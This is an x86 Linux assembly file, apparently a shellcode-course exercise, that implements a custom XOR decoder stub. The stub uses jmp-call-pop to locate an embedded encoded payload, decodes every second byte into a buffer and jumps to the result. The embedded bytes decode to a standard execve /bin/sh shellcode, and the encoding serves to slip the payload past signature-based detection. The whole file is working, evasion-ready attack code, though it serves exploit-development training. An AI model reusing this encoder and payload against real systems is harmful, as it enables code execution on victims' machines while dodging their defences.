;Author : Dibyendu Sikdar
;https://github.com/dibsy/SLAEx86/
;PA-1191

global _start

section .bss
	shellcode: resb 48	;to store the decoded shellcode

section .text

_start:
	jmp short call_shellcode 



decoder:
	pop esi			;esi is read pointer, pop from stack the address of encoded shellcode
	lea edi, [shellcode] 	;edi is write pointer, will write decoded shellcode at location of decoded shellcode
				;push edi

	xor eax, eax		;clear eax , al will be used as loop counter
	xor ebx, ebx		;clear ebx , bl will be used as temporary storage
	xor ecx, ecx		;clear ecx , ecx will act as offset pointer to esi that points to encoded shellcode address 
				;it will be increased by 2 evertime as each value of encoded shellcode is repeated

	mov al, 0x1 		;loop counter 
	
decode:
	cmp al,0x18		;size of actual shellcode is 23 bytes
	jz return_shellcode	;Jump to return _shellcode if value exceeds 23, 
				;our actual shellcode size is 23 ( before any kind of encoding)

	mov bl, byte [esi+ecx]	;get the encoded value at [esi+ecx], example  [esi+0], [exi+2], [esi+4]
	xor bl,0x1 		;xor the value of bl with 0x1 to decode the shellcode value
	mov byte [edi], bl	;push the decoded value to decoded shellcode pointed by edi

	add ecx,0x2		;increase ecx by 2
	inc edi			;mov edi by 1	
	inc al			;increase al by 1
	jmp short decode	;go back to loop start

call_shellcode:
	call decoder
	EncodedShellcode: db 0x30,0x30,0xc1,0xc1,0x51,0x51,0x69,0x69,0x2e,0x2e,0x2e,0x2e,0x72,0x72,0x69,0x69,0x69,0x69,0x2e,0x2e,0x63,0x63,0x68,0x68,0x6f,0x6f,0x88,0x88,0xe2,0xe2,0x51,0x51,0x52,0x52,0x88,0x88,0xe0,0xe0,0xb1,0xb1,0x0a,0x0a,0xcc,0xcc,0x81,0x81,
	
return_shellcode:
	;jump shellcode
	xor eax,eax		;clear eax
	push eax		;push 0x0 to stack
	sub esp,4		;move the esp pointer
	push shellcode		;push address of decoded shellcode on stack
	jmp [esp]		;jump to address stored on the stack

	add esp,8		;bring back the stack as it was before the jmp
	xor eax,eax		;clear eax
	inc eax			;mov 0x1 to eax
	int 0x80		;initiate interrupt for exit()
